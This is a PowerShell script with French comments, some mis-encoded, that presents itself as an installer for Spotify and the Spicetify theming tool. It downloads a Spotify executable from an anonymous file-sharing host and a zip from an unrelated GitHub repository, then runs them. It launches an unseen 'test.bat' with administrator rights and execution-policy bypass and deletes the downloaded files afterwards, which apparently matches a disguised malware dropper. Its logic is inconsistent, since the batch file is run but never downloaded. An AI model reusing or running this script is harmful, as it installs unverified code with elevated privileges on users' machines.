# D�finir l'URL du fichier à t�l�charger et les chemins de destination
$appUrl = "https://anontransfer.com/download-file/1eoQJm4v6y/spotify-1-2-31-1205.exe"
$appOutput = "$env:USERPROFILE\Downloads\spotify-1-2-31-1205.exe"
$zipUrl = "https://github.com/mhltsontop/test-for-now/releases/download/yeaaa/spicetify-2.36.2-windows-x64.zip"
$zipOutput = "$env:USERPROFILE\Downloads\spicetify-2.36.2-windows-x64.zip"
$batUrl = "https://github.com/mhltsontop/test-for-now/releases/download/idk/test.bat"
$batOutput = "$env:USERPROFILE\Downloads\test.bat"
$localAppData = [System.Environment]::GetFolderPath('LocalApplicationData')
$spicetifyFolder = "$env:localAppData\spicetify"

# T�l�charger le fichier d'installation de l'application
Write-Output "T�l�chargement de Spotify..."
Invoke-WebRequest -Uri $appUrl -OutFile $appOutput

# V�rifier si le fichier a �t� t�l�charg�
if (Test-Path $appOutput) {
    Write-Output "T�l�chargement termin�."

    # Installer l'application
    Write-Output "Installation de l'application..."
    Start-Process -FilePath $appOutput
    Write-Output "Installation termin�e."

# Télécharger le script d'installation
$installScriptUrl = "https://raw.githubusercontent.com/spicetify/spicetify-cli/master/install.ps1"
$installScriptPath = "$env:TEMP\install_spicetify.ps1"

Invoke-WebRequest -Uri $installScriptUrl -OutFile $installScriptPath

# Créer un script wrapper pour répondre automatiquement à la question
$wrapperScriptPath = "$env:TEMP\wrapper_install_spicetify.ps1"
$wrapperScriptContent = @"
Start-Process -FilePath "powershell.exe" -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "$installScriptPath"' -NoNewWindow -Wait -RedirectStandardInput "$env:TEMP\auto_response.txt"
"@

# Sauvegarder le script wrapper
Set-Content -Path $wrapperScriptPath -Value $wrapperScriptContent

# Créer le fichier de réponse automatique
$responseFilePath = "$env:TEMP\auto_response.txt"
Set-Content -Path $responseFilePath -Value "Y`n"

# Exécuter le script wrapper
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $wrapperScriptPath" -Wait

    # Supprimer le dossier sp�cifi�
    Remove-Item -Path $spicetifyFolder -Recurse -Force

    # T�l�charger le fichier .zip
    Write-Output "T�l�chargement du nouveau contenu..."
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipOutput

    # Extraire le fichier .zip
    Write-Output "Extraction du contenu..."
    $extractPath = "$env:USERPROFILE\Downloads\spicetify-extracted"
    Expand-Archive -Path $zipOutput -DestinationPath $extractPath -Force

    # Copier le contenu du dossier extrait vers le dossier Spicetify
    Write-Output "Copie du contenu extrait vers $spicetifyFolder..."
    Copy-Item -Path "$extractPath" -Destination $spicetifyFolder -Recurse -Force

    Write-Output "Op�rations termin�es avec succ�s."

    spicetify restore backup apply

    # Chemin vers le fichier .exe de Spotify pour l'utilisateur courant
    $spotifyPath = "$env:USERPROFILE\AppData\Roaming\Spotify\Spotify.exe"

    # Fonction pour arr�ter Spotify
    function Stop-Spotify {
    # Arr�ter tous les processus Spotify en cours
    Get-Process -Name "Spotify" -ErrorAction SilentlyContinue | ForEach-Object {
        $_.CloseMainWindow() | Out-Null
        $_.WaitForExit(10)
        if (!$_.HasExited) {
            $_.Kill()
        }
    }
}

    # Fonction pour d�marrer Spotify
    function Start-Spotify {
    # V�rifier si le fichier Spotify.exe existe
    if (Test-Path -Path $spotifyPath) {
        Start-Process -FilePath $spotifyPath
        Write-Host "Spotify a �t� d�marr�."
    } else {
        Write-Host "Le fichier Spotify.exe n'a pas �t� trouv� � l'emplacement sp�cifi� : $spotifyPath"
    }
}

    # Arr�ter Spotify
    Stop-Spotify
    Write-Host "Spotify a �t� arr�t�."

    # D�marrer Spotify
    Start-Spotify

# Chemin du fichier .bat
$batFile = "$env:USERPROFILE\Downloads\test.bat"

Start-Process powershell.exe -Verb RunAs -ArgumentList ("-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "$batFile")

# Si nous sommes ici, le script est ex�cut� en tant qu'administrateur
Write-Host "Le script est ex�cut� en tant qu'administrateur."

# Ex�cuter le fichier .bat
& "$batFile"

# Nettoyer les fichiers temporaires
Remove-Item -Path $installScriptPath, $wrapperScriptPath, $responseFilePath, $appOutput, $zipOutput, $extractPath, $batOutput

    Write-Output "Tout est fonctionnel!"
    Read-Host "Appuyez sur Entr�e pour fermer"
}